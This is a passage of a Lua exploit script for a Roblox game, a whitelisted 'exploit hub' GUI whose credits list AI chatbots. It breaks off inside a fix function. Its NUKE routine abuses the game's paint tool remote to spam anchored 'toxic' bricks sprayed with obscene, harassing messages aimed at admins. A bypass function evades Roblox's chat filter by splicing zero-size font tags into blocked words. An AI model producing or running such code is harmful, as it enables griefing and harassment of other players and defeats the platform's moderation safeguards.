--[[
  FLAMEMANE — The Chosen One exploit hub
  Red/Orange flame theme | Rayfield-style tabs | Flame opening animation
  credit: stik, claude, gemini, 2AREYOUMENTAL110
]]

-- ============================================================
-- WHITELIST
-- ============================================================
local Players   = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local WHITELIST = {[10429099415]="FLAMEFAML",[9693065023]="kupal_isme8",[4674698402]="warnmachine12908"}
if not WHITELIST[LocalPlayer.UserId] then LocalPlayer:Kick("Not whitelisted."); return end

-- ============================================================
-- SERVICES
-- ============================================================
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService        = game:GetService("RunService")
local TextService       = game:GetService("TextService")

if makefolder then pcall(function() makefolder("WindConfigs") end) end

-- Cleanup old GUIs
for _, g in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
    if g.Name == "FlameMane" or g.Name == "SimpleHub" then g:Destroy() end
end

-- ============================================================
-- COLORS / THEME
-- ============================================================
local C_ACCENT   = Color3.fromRGB(220, 50, 0)
local C_ACCENT2  = Color3.fromRGB(255, 140, 0)
local C_BG       = Color3.fromRGB(12, 6, 6)
local C_BG2      = Color3.fromRGB(22, 10, 10)
local C_BG3      = Color3.fromRGB(34, 14, 14)
local C_DIM      = Color3.fromRGB(140, 70, 50)
local C_WHITE    = Color3.new(1,1,1)
local C_GREEN    = Color3.fromRGB(0, 200, 80)
local C_BLUE     = Color3.fromRGB(11, 95, 226)
local CW         = 340  -- content width

-- ============================================================
-- INTRO ANIMATION — Flame / flamefrags edit style
-- Fast cuts, red flash, typewriter, fire glow, quick burn-in
-- ============================================================
local introGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
introGui.Name = "FlameManeIntro"; introGui.ResetOnSpawn = false
introGui.IgnoreGuiInset = true; introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local iBg = Instance.new("Frame", introGui)
iBg.Size = UDim2.fromScale(1,1); iBg.BackgroundColor3 = Color3.new(0,0,0)
iBg.BackgroundTransparency = 0; iBg.BorderSizePixel = 0; iBg.ZIndex = 20

-- Red glow overlay
local iGlow = Instance.new("Frame", iBg)
iGlow.Size = UDim2.fromScale(1,1); iGlow.BackgroundColor3 = Color3.fromRGB(180,20,0)
iGlow.BackgroundTransparency = 1; iGlow.BorderSizePixel = 0; iGlow.ZIndex = 21

-- Title
local iTxt = Instance.new("TextLabel", iBg)
iTxt.Size = UDim2.new(1,0,0,90); iTxt.Position = UDim2.new(0,0,0.38,-45)
iTxt.Text = ""; iTxt.Font = Enum.Font.GothamBlack; iTxt.TextSize = 72
iTxt.TextColor3 = Color3.fromRGB(255,70,0); iTxt.BackgroundTransparency = 1
iTxt.TextTransparency = 1; iTxt.ZIndex = 22

-- Subtitle
local iSub = Instance.new("TextLabel", iBg)
iSub.Size = UDim2.new(1,0,0,28); iSub.Position = UDim2.new(0,0,0.38,52)
iSub.Text = "THE CHOSEN ONE"; iSub.Font = Enum.Font.GothamBold; iSub.TextSize = 16
iSub.TextColor3 = Color3.fromRGB(255,140,0); iSub.BackgroundTransparency = 1
iSub.TextTransparency = 1; iSub.ZIndex = 22

-- Bar wipe lines (film edit style)
local function makeBar(yOff)
    local b = Instance.new("Frame", iBg)
    b.Size = UDim2.new(0,0,0,3); b.Position = UDim2.new(0,0,0,yOff)
    b.BackgroundColor3 = Color3.fromRGB(255,80,0); b.BackgroundTransparency = 0.2
    b.BorderSizePixel = 0; b.ZIndex = 23; return b
end
local bar1 = makeBar(0); local bar2 = makeBar(0)

task.spawn(function()
    -- Quick flash cut 1
    TweenService:Create(iGlow, TweenInfo.new(0.08), {BackgroundTransparency=0.6}):Play(); task.wait(0.09)
    TweenService:Create(iGlow, TweenInfo.new(0.1), {BackgroundTransparency=1}):Play(); task.wait(0.12)
    -- Bar wipe (top)
    bar1.Position = UDim2.fromOffset(0,0)
    TweenService:Create(bar1, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Size=UDim2.new(1,0,0,3)}):Play(); task.wait(0.08)
    -- Bar wipe (bottom)
    bar2.Position = UDim2.new(0,0,1,-3)
    TweenService:Create(bar2, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Size=UDim2.new(1,0,0,3)}):Play(); task.wait(0.12)
    -- Typewriter "FLAMEMANE"
    local full = "FLAMEMANE"; iTxt.TextTransparency = 0
    for i = 1, #full do
        iTxt.Text = full:sub(1,i); task.wait(0.055)
    end
    -- Subtitle pop
    TweenService:Create(iSub, TweenInfo.new(0.22), {TextTransparency=0}):Play(); task.wait(0.28)
    -- Three fast red flashes (flamefrags edit style)
    for _ = 1,3 do
        TweenService:Create(iGlow, TweenInfo.new(0.04), {BackgroundTransparency=0.5}):Play(); task.wait(0.07)
        TweenService:Create(iGlow, TweenInfo.new(0.06), {BackgroundTransparency=1}):Play(); task.wait(0.1)
    end
    task.wait(0.35)
    -- Burn out: all fades
    TweenService:Create(iTxt,  TweenInfo.new(0.35), {TextTransparency=1}):Play()
    TweenService:Create(iSub,  TweenInfo.new(0.35), {TextTransparency=1}):Play()
    TweenService:Create(iGlow, TweenInfo.new(0.35), {BackgroundTransparency=1}):Play()
    TweenService:Create(iBg,   TweenInfo.new(0.4),  {BackgroundTransparency=1}):Play()
    task.wait(0.45); introGui:Destroy()
end)

-- ============================================================
-- MAIN GUI
-- ============================================================
local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
gui.Name = "FlameMane"; gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true; gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Float toggle button (draggable)
local floatBtn = Instance.new("TextButton", gui)
floatBtn.Size = UDim2.fromOffset(52,52); floatBtn.Position = UDim2.new(0,16,0.5,-26)
floatBtn.BackgroundColor3 = C_BG2; floatBtn.Text = "🔥"
floatBtn.Font = Enum.Font.GothamBold; floatBtn.TextSize = 22
floatBtn.TextColor3 = C_ACCENT; floatBtn.BorderSizePixel = 0; floatBtn.ZIndex = 10
Instance.new("UICorner", floatBtn).CornerRadius = UDim.new(1,0)
local fStroke = Instance.new("UIStroke", floatBtn); fStroke.Color = C_ACCENT; fStroke.Thickness = 2

local fbDrag, fbDS, fbDP = false, nil, nil
floatBtn.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        fbDrag = true; fbDS = i.Position; fbDP = floatBtn.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if fbDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - fbDS
        floatBtn.Position = UDim2.new(fbDP.X.Scale, fbDP.X.Offset+d.X, fbDP.Y.Scale, fbDP.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then fbDrag=false end
end)

-- Main window
local win = Instance.new("Frame", gui)
win.Name = "Window"; win.Size = UDim2.fromOffset(420, 530)
win.Position = UDim2.new(0.5,-210,0.5,-265)
win.BackgroundColor3 = C_BG; win.BorderSizePixel = 0
Instance.new("UICorner", win).CornerRadius = UDim.new(0,14)
local winStroke = Instance.new("UIStroke", win)
winStroke.Color = C_ACCENT; winStroke.Thickness = 1.5

-- Title bar
local titleBar = Instance.new("Frame", win)
titleBar.Size = UDim2.new(1,0,0,36); titleBar.BackgroundColor3 = C_BG2
titleBar.BorderSizePixel = 0
local tbCorner = Instance.new("UICorner", titleBar); tbCorner.CornerRadius = UDim.new(0,14)

local titleTxt = Instance.new("TextLabel", titleBar)
titleTxt.Size = UDim2.new(1,-74,1,0); titleTxt.Position = UDim2.fromOffset(12,0)
titleTxt.Text = "🔥  FLAMEMANE"; titleTxt.Font = Enum.Font.GothamBlack; titleTxt.TextSize = 14
titleTxt.TextColor3 = C_ACCENT; titleTxt.BackgroundTransparency = 1
titleTxt.TextXAlignment = Enum.TextXAlignment.Left

local function mkSmBtn(parent, txt, xOff, color, textCol)
    local b = Instance.new("TextButton", parent)
    b.Size = UDim2.fromOffset(26,20); b.Position = UDim2.new(1,xOff,0.5,-10)
    b.Text = txt; b.Font = Enum.Font.GothamBold; b.TextSize = 13
    b.TextColor3 = textCol or C_WHITE; b.BackgroundColor3 = color
    b.BorderSizePixel = 0; b.AutoButtonColor = false
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,5)
    return b
end
local minBtn   = mkSmBtn(titleBar,"–",-60, C_BG3, Color3.fromRGB(200,200,200))
local closeBtn = mkSmBtn(titleBar,"✕",-30, Color3.fromRGB(60,15,15), Color3.fromRGB(255,80,80))

-- Drag
local wDrag,wDS,wSP = false,nil,nil
titleBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then wDrag=true;wDS=i.Position;wSP=win.Position end
end)
titleBar.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then wDrag=false end
end)
UserInputService.InputChanged:Connect(function(i)
    if wDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - wDS
        win.Position = UDim2.new(wSP.X.Scale, wSP.X.Offset+d.X, wSP.Y.Scale, wSP.Y.Offset+d.Y)
    end
end)

-- Minimize / Close
local minimized = false
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- ============================================================
-- RAYFIELD-STYLE TAB BAR
-- ============================================================
local TAB_NAMES = {"NUKE","FIX","SLOTS","AURA","BKIT","SPAM","ANTI","SCRIPTS","DONATE","ABUSE","AUTO BUILD","SAVE ENLI","CREDITS"}

local tabBar = Instance.new("Frame", win)
tabBar.Name = "TabBar"; tabBar.Size = UDim2.new(1,-4,0,30)
tabBar.Position = UDim2.fromOffset(2,38); tabBar.BackgroundColor3 = C_BG2
tabBar.BorderSizePixel = 0
Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0,8)

local tabScroll = Instance.new("ScrollingFrame", tabBar)
tabScroll.Size = UDim2.fromScale(1,1); tabScroll.BackgroundTransparency = 1
tabScroll.BorderSizePixel = 0; tabScroll.ScrollBarThickness = 0
tabScroll.ScrollingDirection = Enum.ScrollingDirection.X
tabScroll.CanvasSize = UDim2.fromOffset(0,0); tabScroll.AutomaticCanvasSize = Enum.AutomaticSize.X

local tabLayout = Instance.new("UIListLayout", tabScroll)
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
tabLayout.Padding = UDim.new(0,2)
Instance.new("UIPadding", tabScroll).PaddingLeft = UDim.new(0,3)

-- Content area
local contentArea = Instance.new("Frame", win)
contentArea.Name = "Content"; contentArea.Size = UDim2.new(1,-4,1,-74)
contentArea.Position = UDim2.fromOffset(2,72); contentArea.BackgroundTransparency = 1
contentArea.ClipsDescendants = true

-- Page frames
local pageFrames = {}
for i, name in ipairs(TAB_NAMES) do
    local pg = Instance.new("ScrollingFrame", contentArea)
    pg.Name = "Page_"..name; pg.Size = UDim2.fromScale(1,1)
    pg.BackgroundTransparency = 1; pg.BorderSizePixel = 0
    pg.ScrollBarThickness = 3; pg.ScrollBarImageColor3 = C_ACCENT
    pg.CanvasSize = UDim2.fromOffset(0,0); pg.AutomaticCanvasSize = Enum.AutomaticSize.Y
    pg.Visible = (i==1)
    local layout = Instance.new("UIListLayout", pg)
    layout.SortOrder = Enum.SortOrder.LayoutOrder; layout.Padding = UDim.new(0,4)
    local pad = Instance.new("UIPadding", pg)
    pad.PaddingLeft = UDim.new(0,6); pad.PaddingRight = UDim.new(0,6); pad.PaddingTop = UDim.new(0,4)
    pageFrames[i] = pg
end

local pgNuke      = pageFrames[1]
local pgFix       = pageFrames[2]
local pgSlots     = pageFrames[3]
local pgAura      = pageFrames[4]
local pgBkit      = pageFrames[5]
local pgSpam      = pageFrames[6]
local pgAnti      = pageFrames[7]
local pgScripts   = pageFrames[8]
local pgDonate    = pageFrames[9]
local pgAbuse     = pageFrames[10]
local pgAutoBuild = pageFrames[11]
local pgSaveEnli  = pageFrames[12]
local pgCredits   = pageFrames[13]

local activeTab = 1
local tabButtons = {}

local function switchTab(idx)
    for i, pg in ipairs(pageFrames) do pg.Visible = (i==idx) end
    for i, btn in ipairs(tabButtons) do
        btn.BackgroundColor3 = (i==idx) and C_ACCENT or C_BG3
        btn.TextColor3 = (i==idx) and C_WHITE or C_DIM
    end
    activeTab = idx
end

for i, name in ipairs(TAB_NAMES) do
    local w = math.max(46, #name*7+14)
    local btn = Instance.new("TextButton", tabScroll)
    btn.Name = "Tab_"..name; btn.Size = UDim2.fromOffset(w,26)
    btn.LayoutOrder = i
    btn.BackgroundColor3 = (i==1) and C_ACCENT or C_BG3
    btn.TextColor3 = (i==1) and C_WHITE or C_DIM
    btn.Text = name; btn.Font = Enum.Font.GothamBold; btn.TextSize = 9
    btn.BorderSizePixel = 0; btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
    btn.MouseButton1Click:Connect(function() switchTab(i) end)
    tabButtons[i] = btn
end

-- Toggle visibility
local winVisible = true
floatBtn.MouseButton1Click:Connect(function()
    winVisible = not winVisible
    win.Visible = winVisible
    fStroke.Color = winVisible and C_ACCENT or C_ACCENT2
end)
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    contentArea.Visible = not minimized
    tabBar.Visible = not minimized
    win.Size = minimized and UDim2.fromOffset(420,38) or UDim2.fromOffset(420,530)
end)

-- ============================================================
-- UI HELPER FUNCTIONS
-- ============================================================
local function createLabel(parent, text, color, size)
    local l = Instance.new("TextLabel", parent)
    l.Size = UDim2.new(1,-4,0, size and size+6 or 22)
    l.Text = text; l.Font = Enum.Font.GothamBold
    l.TextSize = size or 11; l.TextColor3 = color or C_DIM
    l.BackgroundTransparency = 1; l.TextXAlignment = Enum.TextXAlignment.Left
    return l
end

local function createButton(parent, text, callback, width, height)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(0, width or CW, 0, height or 36)
    btn.BackgroundColor3 = C_BG3; btn.BorderSizePixel = 0
    btn.Text = text; btn.Font = Enum.Font.GothamBold; btn.TextSize = 12
    btn.TextColor3 = C_WHITE; btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
    local st = Instance.new("UIStroke", btn); st.Color = Color3.fromRGB(80,22,22); st.Thickness = 1
    btn.MouseButton1Click:Connect(function()
        local orig = btn.BackgroundColor3
        btn.BackgroundColor3 = C_ACCENT; task.wait(0.12); btn.BackgroundColor3 = orig
        task.spawn(callback)
    end)
    return btn
end

local function createToggle(parent, text, callback, width, height)
    local frame = Instance.new("Frame", parent)
    frame.Size = UDim2.new(0, width or CW, 0, height or 34)
    frame.BackgroundColor3 = C_BG3; frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,8)
    local st = Instance.new("UIStroke", frame); st.Color = Color3.fromRGB(60,18,18); st.Thickness = 1

    local lbl = Instance.new("TextLabel", frame)
    lbl.Size = UDim2.new(1,-52,1,0); lbl.Position = UDim2.fromOffset(10,0)
    lbl.Text = text; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
    lbl.TextColor3 = C_WHITE; lbl.BackgroundTransparency = 1
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    local togBtn = Instance.new("TextButton", frame)
    togBtn.Size = UDim2.fromOffset(38,20); togBtn.Position = UDim2.new(1,-44,0.5,-10)
    togBtn.BackgroundColor3 = Color3.fromRGB(50,18,18); togBtn.BorderSizePixel = 0
    togBtn.Text = ""; togBtn.AutoButtonColor = false
    Instance.new("UICorner", togBtn).CornerRadius = UDim.new(0,10)

    local dot = Instance.new("Frame", togBtn)
    dot.Size = UDim2.fromOffset(14,14); dot.Position = UDim2.fromOffset(3,3)
    dot.BackgroundColor3 = Color3.fromRGB(100,40,40); dot.BorderSizePixel = 0
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)

    local on = false
    local function set(v)
        on = v
        if v then
            togBtn.BackgroundColor3 = C_ACCENT
            TweenService:Create(dot, TweenInfo.new(0.12), {Position=UDim2.fromOffset(21,3), BackgroundColor3=C_WHITE}):Play()
        else
            togBtn.BackgroundColor3 = Color3.fromRGB(50,18,18)
            TweenService:Create(dot, TweenInfo.new(0.12), {Position=UDim2.fromOffset(3,3), BackgroundColor3=Color3.fromRGB(100,40,40)}):Play()
        end
        pcall(callback, v)
    end
    togBtn.MouseButton1Click:Connect(function() set(not on) end)
    frame.setOn = set; frame.getOn = function() return on end
    return frame
end

local function createTextBox(parent, placeholder, width, height)
    local box = Instance.new("TextBox", parent)
    box.Size = UDim2.new(0, width or CW, 0, height or 30)
    box.BackgroundColor3 = C_BG2; box.BorderSizePixel = 0
    box.PlaceholderText = placeholder or ""; box.PlaceholderColor3 = C_DIM
    box.Text = ""; box.Font = Enum.Font.Gotham; box.TextSize = 12
    box.TextColor3 = C_WHITE; box.ClearTextOnFocus = false
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,7)
    local st = Instance.new("UIStroke", box); st.Color = Color3.fromRGB(80,25,25); st.Thickness = 1
    return box
end

local function createDivider(parent)
    local d = Instance.new("Frame", parent)
    d.Size = UDim2.new(1,-4,0,1); d.BackgroundColor3 = Color3.fromRGB(60,18,18)
    d.BorderSizePixel = 0; return d
end

-- ============================================================
-- COLOR PICKER
-- ============================================================
local PickerOverlay = Instance.new("Frame", gui)
PickerOverlay.Size = UDim2.fromScale(1,1); PickerOverlay.BackgroundColor3 = Color3.new(0,0,0)
PickerOverlay.BackgroundTransparency = 0.55; PickerOverlay.Visible = false
PickerOverlay.Active = true; PickerOverlay.ZIndex = 100

local PickerBox = Instance.new("Frame", PickerOverlay)
PickerBox.Size = UDim2.fromOffset(240,310); PickerBox.Position = UDim2.fromScale(0.5,0.5)
PickerBox.AnchorPoint = Vector2.new(0.5,0.5); PickerBox.BackgroundColor3 = C_BG2
PickerBox.BorderSizePixel = 0; PickerBox.ZIndex = 101
Instance.new("UICorner",PickerBox).CornerRadius = UDim.new(0,14)

local PKTop = Instance.new("Frame",PickerBox)
PKTop.Size = UDim2.fromOffset(240,3); PKTop.BackgroundColor3 = C_ACCENT; PKTop.BorderSizePixel = 0
Instance.new("UICorner",PKTop).CornerRadius = UDim.new(0,14)

local PKTitle = Instance.new("TextLabel",PickerBox)
PKTitle.Size=UDim2.fromOffset(240,28); PKTitle.Position=UDim2.fromOffset(0,6)
PKTitle.Text="Color Picker"; PKTitle.Font=Enum.Font.GothamBold; PKTitle.TextSize=14
PKTitle.TextColor3=Color3.fromRGB(200,180,160); PKTitle.BackgroundTransparency=1; PKTitle.ZIndex=102

local SVSq = Instance.new("ImageLabel",PickerBox)
SVSq.Size=UDim2.fromOffset(210,150); SVSq.Position=UDim2.fromOffset(15,36)
SVSq.BackgroundColor3=Color3.fromHSV(0,1,1); SVSq.BorderSizePixel=0; SVSq.ZIndex=102
Instance.new("UICorner",SVSq).CornerRadius=UDim.new(0,5)
local svGH=Instance.new("UIGradient",SVSq)
svGH.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),ColorSequenceKeypoint.new(1,Color3.new(1,1,1))})
svGH.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)}); svGH.Rotation=90
local SVDk=Instance.new("Frame",SVSq)
SVDk.Size=UDim2.fromScale(1,1); SVDk.BackgroundColor3=Color3.new(0,0,0); SVDk.BorderSizePixel=0; SVDk.ZIndex=103
Instance.new("UICorner",SVDk).CornerRadius=UDim.new(0,5)
local svGV=Instance.new("UIGradient",SVDk)
svGV.Color=ColorSequence.new(Color3.new(0,0,0))
svGV.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})
local SVDot=Instance.new("Frame",SVSq)
SVDot.Size=UDim2.fromOffset(12,12); SVDot.AnchorPoint=Vector2.new(0.5,0.5)
SVDot.Position=UDim2.new(1,0,0,0); SVDot.BackgroundColor3=Color3.new(1,1,1)
SVDot.BorderSizePixel=2; SVDot.BorderColor3=Color3.new(0,0,0); SVDot.ZIndex=105
Instance.new("UICorner",SVDot).CornerRadius=UDim.new(1,0)

local HueBar=Instance.new("ImageLabel",PickerBox)
HueBar.Size=UDim2.fromOffset(210,18); HueBar.Position=UDim2.fromOffset(15,196)
HueBar.BackgroundColor3=Color3.new(1,1,1); HueBar.BorderSizePixel=0; HueBar.ZIndex=102
Instance.new("UICorner",HueBar).CornerRadius=UDim.new(0,5)
local hG=Instance.new("UIGradient",HueBar)
hG.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,Color3.fromHSV(0,1,1)),ColorSequenceKeypoint.new(1/6,Color3.fromHSV(1/6,1,1)),
    ColorSequenceKeypoint.new(2/6,Color3.fromHSV(2/6,1,1)),ColorSequenceKeypoint.new(3/6,Color3.fromHSV(3/6,1,1)),
    ColorSequenceKeypoint.new(4/6,Color3.fromHSV(4/6,1,1)),ColorSequenceKeypoint.new(5/6,Color3.fromHSV(5/6,1,1)),
    ColorSequenceKeypoint.new(1,Color3.fromHSV(1,1,1)),
}); hG.Rotation=90
local HueCur=Instance.new("Frame",HueBar)
HueCur.Size=UDim2.fromOffset(4,22); HueCur.AnchorPoint=Vector2.new(0.5,0.5)
HueCur.Position=UDim2.new(0,0,0.5,0); HueCur.BackgroundColor3=Color3.new(1,1,1)
HueCur.BorderSizePixel=1; HueCur.BorderColor3=Color3.new(0,0,0); HueCur.ZIndex=104
Instance.new("UICorner",HueCur).CornerRadius=UDim.new(0,2)

local HexBox=Instance.new("TextBox",PickerBox)
HexBox.Size=UDim2.fromOffset(210,30); HexBox.Position=UDim2.fromOffset(15,224)
HexBox.BackgroundColor3=C_BG3; HexBox.TextColor3=Color3.fromRGB(220,180,160)
HexBox.Font=Enum.Font.Code; HexBox.TextSize=13; HexBox.Text="FF0000"
HexBox.PlaceholderText="RRGGBB"; HexBox.BorderSizePixel=0; HexBox.ZIndex=102
Instance.new("UICorner",HexBox).CornerRadius=UDim.new(0,7)

local SwPrev=Instance.new("Frame",PickerBox)
SwPrev.Size=UDim2.fromOffset(210,22); SwPrev.Position=UDim2.fromOffset(15,264)
SwPrev.BackgroundColor3=Color3.fromRGB(255,0,0); SwPrev.BorderSizePixel=0; SwPrev.ZIndex=102
Instance.new("UICorner",SwPrev).CornerRadius=UDim.new(0,5)

local PKConf=Instance.new("TextButton",PickerBox)
PKConf.Size=UDim2.fromOffset(210,32); PKConf.Position=UDim2.fromOffset(15,272)
PKConf.BackgroundColor3=C_ACCENT; PKConf.Text="CONFIRM"
PKConf.Font=Enum.Font.GothamBold; PKConf.TextSize=14; PKConf.TextColor3=C_WHITE
PKConf.BorderSizePixel=0; PKConf.ZIndex=102
Instance.new("UICorner",PKConf).CornerRadius=UDim.new(0,8)
PKConf.MouseButton1Click:Connect(function() PickerOverlay.Visible=false end)

local curPB=nil; local pH,pS,pV=0,1,1
local function toHex(c) return string.format("%02X%02X%02X",math.round(c.R*255),math.round(c.G*255),math.round(c.B*255)) end
local function updatePicker()
    SVSq.BackgroundColor3=Color3.fromHSV(pH,1,1)
    SVDot.Position=UDim2.new(pS,0,1-pV,0); HueCur.Position=UDim2.new(pH,0,0.5,0)
    local c=Color3.fromHSV(pH,pS,pV)
    if curPB then curPB.BackgroundColor3=c end
    SwPrev.BackgroundColor3=c; HexBox.Text=toHex(c)
end
local svDrag,hueDrag=false,false
local function svIn(i)
    pS=math.clamp((i.Position.X-SVSq.AbsolutePosition.X)/SVSq.AbsoluteSize.X,0,1)
    pV=1-math.clamp((i.Position.Y-SVSq.AbsolutePosition.Y)/SVSq.AbsoluteSize.Y,0,1); updatePicker()
end
local function hueIn(i)
    pH=math.clamp((i.Position.X-HueBar.AbsolutePosition.X)/HueBar.AbsoluteSize.X,0,1); updatePicker()
end
for _, el in ipairs({SVSq,SVDk}) do
    el.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=true;svIn(i) end end)
end
HueBar.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then hueDrag=true;hueIn(i) end end)
UserInputService.InputChanged:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
        if svDrag then svIn(i) end; if hueDrag then hueIn(i) end
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then svDrag=false;hueDrag=false end
end)
HexBox.FocusLost:Connect(function()
    local h=HexBox.Text:gsub("#",""):upper()
    if #h==6 then
        local r=tonumber("0x"..h:sub(1,2)); local g=tonumber("0x"..h:sub(3,4)); local b=tonumber("0x"..h:sub(5,6))
        if r and g and b then local hv,sv,vv=Color3.toHSV(Color3.fromRGB(r,g,b)); pH,pS,pV=hv,sv,vv; updatePicker() end
    end
end)
local function openPicker(btn)
    curPB=btn; local h,s,v=Color3.toHSV(btn.BackgroundColor3); pH,pS,pV=h,s,v; updatePicker()
    PickerOverlay.Visible=true
end

-- ============================================================
-- CORE NUKE / FIX LOGIC
-- ============================================================
local faces     = {"Front","Back","Top","Bottom","Right","Left"}
local faceEnums = {Front=Enum.NormalId.Front,Back=Enum.NormalId.Back,Top=Enum.NormalId.Top,
                   Bottom=Enum.NormalId.Bottom,Right=Enum.NormalId.Right,Left=Enum.NormalId.Left}
local faceData   = {}
local LIGHT_GRAY = Color3.fromRGB(200,200,200)

local function getPaintRemote()
    local char=LocalPlayer.Character; if not char then return nil,nil end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil,nil end
    local tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
    if not tool then return nil,nil end
    if tool.Parent~=char then
        local hum=char:FindFirstChildOfClass("Humanoid")
        if hum then hum:EquipTool(tool); task.wait(0.25) end
        tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
        if not tool then return nil,nil end
    end
    local remote=tool:FindFirstChild("Event",true) or tool:FindFirstChildWhichIsA("RemoteEvent",true)
    return remote, hrp.Position
end
local function getBrick() return ReplicatedStorage:FindFirstChild("Brick") end

-- BYPASS
local BP = "<font size='0'></font>"
local function isFiltered(text)
    local ok, result = pcall(function()
        local f = TextService:FilterStringAsync(text, LocalPlayer.UserId)
        return f:GetNonChatStringForBroadcastAsync()
    end)
    if not ok then return false end
    return result:find("###") ~= nil
end
local function bypassText(text)
    if not isFiltered(text) then return text end
    local out = ""; local chars = {}
    for i = 1,#text do chars[i]=text:sub(i,i) end
    local chunkSizes = {5,4,3,2,1}
    for _, sz in ipairs(chunkSizes) do
        out = ""; local i = 1
        while i <= #chars do
            local chunk = ""; local j = i
            while j < i+sz and j <= #chars do chunk=chunk..chars[j]; j=j+1 end
            out = out..chunk..BP; i = i+sz
        end
        if not isFiltered(out) then return out end
    end
    out = ""
    for _, c in ipairs(chars) do out=out..c..BP end
    return out
end

local function getNearestPlacedBrick()
    local char=LocalPlayer.Character; if not char then return nil end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
    local folders={"Bricks","Build","Placed","Blocks","UserBricks"}
    local best,bestDist=nil,math.huge
    for _,fname in ipairs(folders) do
        local f=workspace:FindFirstChild(fname)
        if f then
            for _,v in ipairs(f:GetDescendants()) do
                if v:IsA("BasePart") then
                    local d=(v.Position-hrp.Position).Magnitude
                    if d<bestDist then bestDist=d; best=v end
                end
            end
        end
    end
    return best
end

-- Auto toggles state
local autoAnchorActive  = false
local autoToxicActive   = false
local autoUnanchorActive = false
local autoUntoxicActive  = false

-- NUKE
local function runNuke()
    local remote,rootPos=getPaintRemote(); local brick=getBrick()
    if not remote or not brick then print("[NUKE] missing tools"); return end
    local key = "both \u{1F91D}"
    local blk = Color3.new(0,0,0)
    local tp = {
        Front  = bypassText("Fuck Admin"),
        Back   = bypassText("say i eat pussy"),
        Top    = bypassText("hacked by FLAMEFAML/STIK"),
        Bottom = bypassText("GGS BIG W TO STIK"),
        Right  = bypassText("ADMIN HATES YOU"),
        Left   = bypassText("CRY GGS"),
    }
    -- Toxic + anchor with retry
    local maxRetries=8
    for attempt=1,maxRetries do
        pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,blk,"toxic","anchor") end)
        task.wait(0.3)
        pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,blk,"anchor","") end)
        task.wait(0.25)
        local placed=getNearestPlacedBrick()
        if placed and placed.Anchored then print("[NUKE] Anchor confirmed attempt "..attempt); break end
        if attempt<maxRetries then print("[NUKE] Retry anchor "..attempt.."/"..maxRetries); task.wait(0.2) end
    end
    -- Paint faces
    for _,n in ipairs(faces) do
        local rawTxt = faceData[n] and faceData[n].txt and faceData[n].txt.Text~="" and faceData[n].txt.Text or (tp[n] or "GGS")
        local ft = bypassText(rawTxt)
        local fc = faceData[n] and faceData[n].clr and faceData[n].clr.BackgroundColor3 or Color3.fromRGB(255,0,0)
        for _=1,3 do pcall(function() remote:FireServer(brick,faceEnums[n],rootPos,key,fc,"spray",ft) end); task.wait(0.1) end
    end
    print("[NUKE] Done — TOXIC + ANCHORED")
end

-- FIX
local function runFix()
    for _,n in ipairs(faces) do
        if faceData[n] then
            if faceData[n].txt then faceData[n].txt.Text="" end
            if faceData[n].clr then faceData[n].clr.BackgroundColor3=LIGHT_GRAY end
        end
    end
